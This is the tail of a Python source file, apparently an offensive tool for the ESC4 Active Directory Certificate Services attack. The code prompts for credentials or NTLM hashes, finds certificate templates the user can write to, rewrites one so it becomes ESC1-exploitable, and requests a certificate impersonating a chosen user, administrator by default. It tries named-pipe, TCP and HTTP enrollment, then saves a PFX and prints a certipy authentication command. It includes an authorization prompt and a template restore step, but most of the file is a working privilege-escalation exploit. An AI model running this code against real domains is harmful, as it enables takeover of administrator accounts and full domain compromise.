    # ── Method 1: named-pipe \\pipe\\cert ────────────────────────────────────
    def _try_named_pipe(
        self, ca_name: str, template: str, csr: bytes
    ) -> Optional[bytes]:
        host = self.target.dc_ip
        # Use a raw string so \p is not treated as an escape sequence
        pipe_path = r"\\pipe\\cert"
        print_info(f"[Method 1] MS-WCCE via {pipe_path} -> {host}")
        try:
            rpct = self._rpc_transport(f"ncacn_np:{host}[\\pipe\\cert]")
            dce  = rpct.get_dce_rpc()
            dce.connect()
            dce.bind(uuidtup_to_bin((ICERTPASSAGE_UUID, ICERTPASSAGE_VERSION)))
            print_debug(r"Bound to ICertPassage via \pipe\cert")
            dce.call(0, _build_req(ca_name, template, csr))
            resp = dce.recv()
            print_debug(f"Received {len(resp)} bytes")
            disp, cert = _parse_resp(resp)
            if disp == CR_DISP_ISSUED and cert:
                return cert
            if disp == CR_DISP_UNDER_SUBMISSION:
                raise CertificateRequestError(
                    "Certificate request is PENDING manager approval. "
                    "Disable the approval requirement on the template first."
                )
            if disp == CR_DISP_DENIED:
                raise CertificateRequestError(
                    "Certificate request was DENIED by the CA."
                )
            if cert:
                return cert
            self._note(
                r"\pipe\cert",
                f"disposition={disp} ({CR_DISP_NAMES.get(disp, 'UNKNOWN')})"
            )
        except CertificateRequestError:
            raise
        except Exception as e:
            self._note(r"\pipe\cert", str(e))
        return None

    # ── Method 2: named-pipe epmapper ────────────────────────────────────────
    def _try_named_pipe_alt(
        self, ca_name: str, template: str, csr: bytes
    ) -> Optional[bytes]:
        host = self.target.dc_ip
        pipe_path = r"\\pipe\\epmapper"
        print_info(f"[Method 2] MS-WCCE via {pipe_path} -> {host}")
        try:
            rpct = self._rpc_transport(f"ncacn_np:{host}[\\pipe\\epmapper]")
            dce  = rpct.get_dce_rpc()
            dce.connect()
            dce.bind(uuidtup_to_bin((ICERTPASSAGE_UUID, ICERTPASSAGE_VERSION)))
            print_debug(r"Bound to ICertPassage via \pipe\epmapper")
            dce.call(0, _build_req(ca_name, template, csr))
            resp = dce.recv()
            disp, cert = _parse_resp(resp)
            if cert and disp in (CR_DISP_ISSUED, CR_DISP_INCOMPLETE):
                return cert
            self._note(r"\pipe\epmapper", f"disposition={disp}")
        except CertificateRequestError:
            raise
        except Exception as e:
            self._note(r"\pipe\epmapper", str(e))
        return None

    # ── Method 3: TCP port scan ───────────────────────────────────────────────
    def _try_tcp_direct(
        self, ca_name: str, template: str, csr: bytes
    ) -> Optional[bytes]:
        host = self.target.dc_ip
        print_info(f"[Method 3] MS-WCCE via TCP port scan -> {host}")
        candidate_ports = list(range(49152, 49165))
        for port in candidate_ports:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(2)
                result = s.connect_ex((host, port))
                s.close()
                if result != 0:
                    continue
                print_debug(f"Port {port} open, trying ICertPassage bind...")
                rpct = self._rpc_transport(f"ncacn_ip_tcp:{host}[{port}]")
                dce  = rpct.get_dce_rpc()
                dce.connect()
                dce.bind(uuidtup_to_bin((ICERTPASSAGE_UUID, ICERTPASSAGE_VERSION)))
                print_debug(f"Bound to ICertPassage on TCP:{port}")
                dce.call(0, _build_req(ca_name, template, csr))
                resp = dce.recv()
                disp, cert = _parse_resp(resp)
                if cert:
                    return cert
            except CertificateRequestError:
                raise
            except Exception as e:
                print_debug(f"TCP:{port} -> {e}")
                continue
        self._note("TCP direct", "No open port responded to ICertPassage")
        return None

    # ── Method 4: HTTP certsrv ────────────────────────────────────────────────
    def _try_http(
        self,
        ca_host:  str,
        ca_name:  str,
        template: str,
        csr:      bytes,
    ) -> Optional[bytes]:
        if not REQUESTS_AVAILABLE:
            self._note("HTTP", "requests not installed: pip install requests")
            return None

        print_info("[Method 4] HTTP certsrv enrollment")

        # Build NTLM auth object
        if NTLM_AUTH_AVAILABLE:
            auth = HttpNtlmAuth(
                f"{self.user.domain}\\{self.user.username}",
                self.user.password or "",
            )
            print_debug("Using requests-ntlm for NTLM authentication")
        else:
            # Fall back — will likely get 401 but worth trying
            auth = (
                f"{self.user.domain}\\{self.user.username}",
                self.user.password or "",
            )
            print_warning(
                "requests-ntlm not installed. "
                "HTTP auth may fail. Run: pip install requests-ntlm"
            )

        csr_b64 = base64.b64encode(csr).decode()

        # Build candidate URL list: IP first (avoids DNS failures),
        # then hostname.  Only HTTP — HTTPS/443 is confirmed closed.
        hosts   = list(dict.fromkeys([self.target.dc_ip, ca_host]))
        schemes = ["http"]   # HTTPS/443 not listening on this CA

        for host in hosts:
            for scheme in schemes:
                url = f"{scheme}://{host}/certsrv/certfnsh.asp"
                print_info(f"  Trying: {url}")
                try:
                    sess = req_lib.Session()
                    post_data = {
                        "Mode":             "newreq",
                        "CertRequest":      csr_b64,
                        "CertAttrib":       f"CertificateTemplate:{template}",
                        "TargetStoreFlags": "0",
                        "SaveCert":         "yes",
                        "ThumbPrint":       "",
                    }
                    resp = sess.post(
                        url,
                        data=post_data,
                        auth=auth,
                        verify=False,
                        timeout=self.target.timeout,
                        headers={"User-Agent": "Mozilla/5.0"},
                        allow_redirects=True,
                    )
                    print_debug(f"  HTTP status: {resp.status_code}")

                    if resp.status_code == 401:
                        self._note(
                            f"HTTP {url}",
                            "401 Unauthorized — install requests-ntlm: "
                            "pip install requests-ntlm"
                        )
                        continue

                    if resp.status_code not in (200, 201):
                        self._note(
                            f"HTTP {url}",
                            f"Unexpected status {resp.status_code}"
                        )
                        continue

                    # ── Analyse the response page ───────────────────────────
                    status, req_id = _analyse_certsrv_response(resp.text)
                    print_debug(
                        f"  certsrv page analysis: status={status} "
                        f"req_id={req_id}"
                    )

                    if status == "denied":
                        # Check if template is not published on this CA
                        if "template" in resp.text.lower():
                            raise CertificateRequestError(
                                "Certificate request DENIED by CA.\n"
                                "  Possible causes:\n"
                                f"  - Template '{template}' is not published "
                                f"on CA '{ca_name}'\n"
                                "  - CA policy is blocking the request\n"
                                "  - The requesting user lacks Enroll permission"
                            )
                        raise CertificateRequestError(
                            "Certificate request DENIED by the CA."
                        )

                    if status == "pending":
                        raise CertificateRequestError(
                            "Certificate is PENDING manager approval.\n"
                            "  Disable manager approval on the template "
                            "before requesting."
                        )

                    if status == "issued" and req_id:
                        cert_url = (
                            f"{scheme}://{host}/certsrv/certnew.cer"
                            f"?ReqID={req_id}&Enc=bin"
                        )
                        print_info(f"  Fetching certificate: {cert_url}")
                        cr = sess.get(
                            cert_url, auth=auth,
                            verify=False,
                            timeout=self.target.timeout,
                        )
                        if cr.status_code == 200 and self._is_cert(cr.content):
                            print_success(
                                f"Certificate issued! "
                                f"(ReqID={req_id}, {len(cr.content)} bytes)"
                            )
                            return cr.content

                    # Try PEM embedded in page body as last resort
                    cert = self._pem_from_html(resp.text)
                    if cert:
                        print_success("Certificate extracted from page body")
                        return cert

                    self._note(
                        f"HTTP {url}",
                        f"200 received but no certificate found "
                        f"(page status='{status}')"
                    )

                except CertificateRequestError:
                    raise
                except Exception as e:
                    self._note(f"HTTP {url}", str(e))

        return None

    @staticmethod
    def _is_cert(data: bytes) -> bool:
        try:
            from cryptography import x509 as cx
            cx.load_der_x509_certificate(data, default_backend())
            return True
        except Exception:
            return False

    @staticmethod
    def _pem_from_html(html: str) -> Optional[bytes]:
        m = re.search(
            r"-----BEGIN CERTIFICATE-----(.*?)-----END CERTIFICATE-----",
            html, re.DOTALL,
        )
        if m:
            try:
                from cryptography import x509 as cx
                pem = (
                    "-----BEGIN CERTIFICATE-----"
                    + m.group(1)
                    + "-----END CERTIFICATE-----"
                ).encode()
                return cx.load_pem_x509_certificate(
                    pem, default_backend()
                ).public_bytes(serialization.Encoding.DER)
            except Exception:
                pass
        return None

    # ── Save PFX + PEM ────────────────────────────────────────────────────────
    def _save(self, cert_der: bytes, key, out: str) -> str:
        from cryptography import x509 as cx
        cert_obj  = cx.load_der_x509_certificate(cert_der, default_backend())
        pfx_bytes = pkcs12.serialize_key_and_certificates(
            name=os.path.basename(out).encode(),
            key=key, cert=cert_obj, cas=None,
            encryption_algorithm=serialization.NoEncryption(),
        )
        pfx = out + ".pfx"
        with open(pfx, "wb") as f: f.write(pfx_bytes)
        print_success(f"Saved PFX : {pfx}")

        pem = out + ".pem"
        with open(pem, "wb") as f:
            f.write(cert_obj.public_bytes(serialization.Encoding.PEM))
            f.write(key.private_bytes(
                serialization.Encoding.PEM,
                serialization.PrivateFormat.TraditionalOpenSSL,
                serialization.NoEncryption(),
            ))
        print_success(f"Saved PEM : {pem}")
        return pfx

    # ── Public entry point ────────────────────────────────────────────────────
    def request_certificate(
        self,
        ca:       CertificateAuthority,
        template: ESC4Template,
        upn:      str,
        out:      str = "/tmp/esc4_cert",
    ) -> str:
        print_banner("REQUESTING CERTIFICATE")
        print_info(f"CA       : {ca.name}")
        print_info(f"Template : {template.name}")
        print_info(f"Subject  : {self.user.username}")
        print_info(f"Alt UPN  : {upn}")

        csr_der, key = self._build_csr(
            self.user.username, upn,
            template.minimal_key_size or 2048,
        )
        print_success(f"CSR generated ({len(csr_der)} bytes)")

        self._errors = []
        cert_der: Optional[bytes] = None

        cert_der = self._try_named_pipe(ca.name, template.name, csr_der)

        if cert_der is None:
            cert_der = self._try_named_pipe_alt(ca.name, template.name, csr_der)

        if cert_der is None:
            cert_der = self._try_tcp_direct(ca.name, template.name, csr_der)

        if cert_der is None:
            ca_host  = ca.dns_hostname or self.target.dc_ip
            cert_der = self._try_http(
                ca_host, ca.name, template.name, csr_der
            )

        if cert_der is None:
            error_lines = "\n".join(f"  • {e}" for e in self._errors)
            raise CertificateRequestError(
                f"All transport methods failed.\n\n"
                f"Per-method errors:\n{error_lines}\n\n"
                f"Checklist:\n"
                f"  • SMB port 445 reachable:  "
                f"nc -zv {self.target.dc_ip} 445\n"
                f"  • HTTP port 80  reachable:  "
                f"nc -zv {self.target.dc_ip} 80\n"
                f"  • CA service running on DC:  "
                f"services.msc → Certificate Services\n"
                f"  • Template published on CA:  "
                f"certsrv.msc → Certificate Templates\n"
                f"  • NTLM auth helper:  "
                f"pip install requests-ntlm\n"
            )

        pfx = self._save(cert_der, key, out)
        print_success(f"Certificate saved: {pfx}")
        print_info(
            f"\nAuthenticate:\n"
            f"  certipy auth -pfx {pfx} "
            f"-username {upn.split('@')[0]} "
            f"-domain {self.user.domain}\n"
        )
        return pfx

#
# =============================================================================
# ESC4 Attack Orchestrator
# =============================================================================
class ESC4Attack:
    def __init__(self):
        self.ldap:     Optional[LDAPManager]   = None
        self.user:     Optional[ADUser]         = None
        self.target:   Optional[TargetConfig]   = None
        self.backup:   Optional[TemplateBackup] = None
        self.template: Optional[ESC4Template]   = None
        self.modified: bool = False

    # ── Validated credential collection ──────────────────────────────────────
    def _get_credentials(self) -> Tuple[ADUser, TargetConfig]:
        print_banner("STEP 1: CREDENTIALS & TARGET")

        # Username
        username, domain = Validator.prompt_with_validation(
            "Username (format: user@domain.com or DOMAIN\\user): ",
            Validator.validate_username,
        )

        # Auth method
        print("\nSelect authentication method:")
        print("  [1] Password")
        print("  [2] NTLM Hash (pass-the-hash)")
        for attempt in range(1, 6):
            choice = input("Enter choice [1/2]: ").strip()
            if choice in ("1", "2"):
                break
            print_error(f"Invalid choice '{choice}'. Enter 1 or 2.")
        else:
            raise ESC4Error("Too many invalid auth method choices.")

        password, nthash = None, None
        if choice == "2":
            nthash = Validator.prompt_with_validation(
                "NTLM Hash (32 hex chars or LM:NT): ",
                Validator.validate_nthash,
            )
        else:
            password = Validator.prompt_with_validation(
                "Password: ",
                Validator.validate_password,
                secret=True,
            )

        # DC IP
        dc_ip = Validator.prompt_with_validation(
            "Domain Controller IP: ",
            Validator.validate_ip,
        )

        # DC Hostname (optional)
        dc_host = Validator.prompt_with_validation(
            "DC Hostname (optional, press Enter to skip): ",
            Validator.validate_hostname,
            allow_empty=True,
            default="",
        )
        dc_host = dc_host or None

        # LDAPS
        for attempt in range(1, 6):
            ldaps_raw = input("Use LDAPS (port 636)? [Y/n]: ").strip().lower()
            if ldaps_raw in ("", "y", "yes", "n", "no"):
                use_ldaps = ldaps_raw not in ("n", "no")
                break
            print_error(f"Enter Y or N.")
        else:
            use_ldaps = True

        u = ADUser(
            username=username, domain=domain,
            password=password, nthash=nthash,
        )
        t = TargetConfig(
            dc_ip=dc_ip, dc_host=dc_host, domain=domain,
            ldap_port=636 if use_ldaps else 389,
            use_ldaps=use_ldaps,
        )
        print_success(f"Configured for user: {u.upn}")
        print_success(f"Target DC: {dc_ip}")
        return u, t

    def _is_esc1(self, t: ESC4Template) -> bool:
        has_auth = (
            EKU_CLIENT_AUTH    in t.extended_key_usage
            or EKU_ANY_PURPOSE in t.extended_key_usage
            or not t.extended_key_usage
        )
        return (
            has_auth
            and bool(t.certificate_name_flag & CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT)
            and not t.requires_manager_approval
            and t.authorized_signatures_required == 0
        )

    def _show_template(self, t: ESC4Template):
        has_auth = (
            EKU_CLIENT_AUTH    in t.extended_key_usage
            or EKU_ANY_PURPOSE in t.extended_key_usage
            or not t.extended_key_usage
        )
        print(f"\nTemplate Analysis:")
        print(f"  Name                     : {t.name}")
        print(f"  Enabled on CA            : {t.enabled}")
        print(f"  Schema Version           : {t.schema_version}")
        print(f"  Has Client Auth EKU      : {has_auth}")
        print(f"  Enrollee Supplies Subject: "
              f"{bool(t.certificate_name_flag & CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT)}")
        print(f"  Requires Manager Approval: {t.requires_manager_approval}")
        print(f"  Authorized Signatures    : {t.authorized_signatures_required}")

    # ── Main flow ─────────────────────────────────────────────────────────────
    def run(self):
        # ─── Banner ──────────────────────────────────────────────────────────────
        print(f"{Colors.BOLD}{Colors.OKCYAN}╔═════════════════════════════════════════════════════════════════════════════╗{Colors.ENDC}")
        print(f"{Colors.BOLD}{Colors.OKCYAN}║                      ESC4 CERTIFICATE TEMPLATE ABUSE                        ║{Colors.ENDC}")
        print(f"{Colors.BOLD}{Colors.OKCYAN}║        Active Directory Privilege Escalation via Certificate Templates      ║{Colors.ENDC}")
        print(f"{Colors.BOLD}{Colors.OKCYAN}║                                                                             ║{Colors.ENDC}")
        print(f"{Colors.BOLD}{Colors.OKCYAN}╚═════════════════════════════════════════════════════════════════════════════╝{Colors.ENDC}")
        # ──────────────────────────────────────────────────────────────────────────
        

        # Consent gate
        for attempt in range(1, 4):
            consent = input(
                "Do you have authorization to test this environment? [y/N]: "
            ).strip().lower()
            if consent in ("y", "yes"):
                break
            if consent in ("n", "no", ""):
                print("Exiting — no authorization confirmed.")
                sys.exit(0)
            print_error("Please enter Y (yes) or N (no).")
        else:
            print("Exiting.")
            sys.exit(0)

        try:
            # Step 1
            self.user, self.target = self._get_credentials()

            # Step 2
            print_banner("STEP 2: LDAP CONNECTION")
            self.ldap = LDAPManager(self.user, self.target)
            self.ldap.connect()

            # Step 3
            print_banner("STEP 3: ENUMERATING CERTIFICATE TEMPLATES")
            print_info("Searching for certificate templates...")
            vuln = self.ldap.find_esc4_templates()
            if not vuln:
                print_error("No ESC4-vulnerable templates found for your user.")
                return
            print_success(f"Found {len(vuln)} ESC4-vulnerable template(s)")
            print_info("Enumerating Certificate Authorities...")
            cas = self.ldap.get_cas()

            # Step 4
            print_banner("STEP 4: SELECT TARGET TEMPLATE")
            print("\nSelect template to exploit:")
            for i, t in enumerate(vuln, 1):
                print(f"  [{i}] {t.name} ({', '.join(t.vulnerable_permissions)})")

            for attempt in range(1, 6):
                try:
                    c = int(input("Enter choice: ").strip())
                    if 1 <= c <= len(vuln):
                        self.template = vuln[c - 1]
                        break
                    print_error(f"Enter a number between 1 and {len(vuln)}.")
                except ValueError:
                    print_error("Enter a numeric choice.")
            else:
                raise ESC4Error("Too many invalid template selections.")

            self._show_template(self.template)
            if self._is_esc1(self.template):
                print("\nTemplate already exploitable as ESC1!")
            else:
                print_warning("Template needs modification to become ESC1")

            # Step 5
            print_banner("STEP 5: SELECT CERTIFICATE AUTHORITY")
            if not cas:
                raise ESC4Error("No CAs found!")
            if len(cas) == 1:
                ca = cas[0]
                print_info(f"Auto-selected CA: {ca.name}")
            else:
                print("Select CA:")
                for i, c in enumerate(cas, 1):
                    print(f"  [{i}] {c.name}")
                for attempt in range(1, 6):
                    try:
                        c = int(input("Enter choice: ").strip())
                        if 1 <= c <= len(cas):
                            ca = cas[c - 1]
                            break
                        print_error(f"Enter a number between 1 and {len(cas)}.")
                    except ValueError:
                        print_error("Enter a numeric choice.")
                else:
                    raise ESC4Error("Too many invalid CA selections.")
            print_success(f"Using CA: {ca.name}")

            # Step 6
            print_banner("STEP 6: BACKUP ORIGINAL TEMPLATE")
            print_info(f"Backing up: {self.template.name}")
            self.backup = self.ldap.backup_template(self.template)
            ts       = datetime.now().strftime("%Y%m%d_%H%M%S")
            bak_file = f"{self.template.name}_backup_{ts}.json"
            with open(bak_file, "w") as f:
                json.dump({
                    "template_name":       self.backup.template_name,
                    "backup_time":         self.backup.backup_time,
                    "original_attributes": {
                        k: (v.hex() if isinstance(v, bytes) else v)
                        for k, v in self.backup.original_attributes.items()
                    },
                }, f, indent=2)
            print_success(f"Backup saved to: {bak_file}")

            # Confirm before modifying
            for attempt in range(1, 4):
                confirm = input(
                    "Proceed with template modification? [Y/n]: "
                ).strip().lower()
                if confirm in ("", "y", "yes"):
                    break
                if confirm in ("n", "no"):
                    raise ESC4UserCancelled("User chose not to proceed")
                print_error("Enter Y or N.")

            # Step 7
            print_banner("STEP 7: MODIFY TEMPLATE FOR ESC1")
            self.ldap.modify_template_for_esc1(self.template)
            self.modified = True
            print_success("Template modified successfully")
            print_warning("Template is now vulnerable to ESC1!")
            print_info("Waiting 5 seconds for AD replication...")
            time.sleep(5)

            # Step 8
            print_banner("STEP 8: REQUEST CERTIFICATE")
            target_upn = Validator.prompt_with_validation(
                "Target user to impersonate [administrator]: ",
                lambda raw: Validator.validate_target_user(
                    raw, self.user.domain
                ),
                allow_empty=True,
                default=f"administrator@{self.user.domain}",
            )
            # handle empty → default
            if not target_upn or "@" not in target_upn:
                target_upn = f"administrator@{self.user.domain}"

            print_info(f"Will request certificate for: {target_upn}")

            engine = CertificateRequestEngine(self.user, self.target)
            pfx    = engine.request_certificate(
                ca, self.template, target_upn,
                f"/tmp/esc4_{self.user.username}_{self.template.name}",
            )
            print_success("=" * 60)
            print_success("ESC4 ATTACK SUCCESSFUL!")
            print_success(f"Certificate : {pfx}")
            print_success("=" * 60)
            print_info(
                f"\nAuthenticate:\n"
                f"  certipy auth -pfx {pfx} "
                f"-username {target_upn.split('@')[0]} "
                f"-domain {self.user.domain}\n"
            )

        except ESC4UserCancelled as e:
            print_info(f"Operation cancelled: {e}")
        except KeyboardInterrupt:
            print_warning("\nInterrupted by user")
        except InputValidationError as e:
            print_error(f"Validation error: {e}")
        except LDAPConnectionError as e:
            print_error(f"LDAP connection error: {e}")
            print_info("Check that:")
            print_info(f"  - The DC IP {self.target.dc_ip if self.target else '?'} is correct and reachable")
            print_info(f"  - LDAP{'S' if (self.target and self.target.use_ldaps) else ''} port is open")
            print_info( "  - Credentials are correct")
        except CertificateRequestError as e:
            print_error("Certificate request failed:")
            for line in str(e).splitlines():
                print(f"    {line}")
        except PermissionDeniedError as e:
            print_error(f"Permission denied: {e}")
        except ESC4Error as e:
            print_error(f"Attack failed: {e}")
        except Exception as e:
            print_error(f"Unexpected error: {type(e).__name__}: {e}")
            traceback.print_exc()
        finally:
            self._cleanup()

    def _cleanup(self):
        print_warning("\nCLEANUP INITIATED")
        if self.modified and self.backup and self.ldap and self.template:
            print_info("Template was modified - attempting restore...")
            try:
                ok = self.ldap.restore_template(self.backup, self.template.dn)
                if not ok:
                    print_error(
                        "Restore FAILED — restore manually using backup file: "
                        f"{self.template.name}_backup_*.json"
                    )
            except Exception as e:
                print_error(f"Restore exception: {e}")
        if self.ldap:
            self.ldap.disconnect()
        print_warning("Cleanup complete. Verify environment state.")

#
# =============================================================================
# Entry point
# =============================================================================
if __name__ == "__main__":
    missing = []
    if not LDAP_AVAILABLE:     missing.append("ldap3")
    if not CRYPTO_AVAILABLE:   missing.append("cryptography")
    if not IMPACKET_AVAILABLE: missing.append("impacket")
    if missing:
        print(f"[-] Missing required libraries: {', '.join(missing)}")
        print(f"    Install with:  pip install {' '.join(missing)}")
        sys.exit(1)
    ESC4Attack().run()
